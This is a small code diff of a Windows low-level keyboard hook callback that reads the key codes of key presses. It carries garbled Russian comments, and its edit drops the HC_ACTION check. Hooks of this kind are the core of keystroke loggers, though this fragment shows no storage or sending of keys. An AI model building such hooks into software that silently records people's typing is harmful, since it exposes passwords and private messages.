@@ -4,7 +4,7 @@
 LRESULT CALLBACK KeyBoardCallBack(int code, WPARAM wParam, LPARAM lParam)
 {
 	PKBDLLHOOKSTRUCT HookData = (PKBDLLHOOKSTRUCT)lParam;
-	if (code == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
+	if (wParam == WM_KEYDOWN)
 	{
 		DWORD iKey = MapVirtualKeyW(HookData->vkCode, NULL) << 16; //¬иртуальный код клавишы
 		if (!(HookData->vkCode <= 1 << 5)) // 32 (т.к. первые 32 символа €вл€ютс€ не печатными)
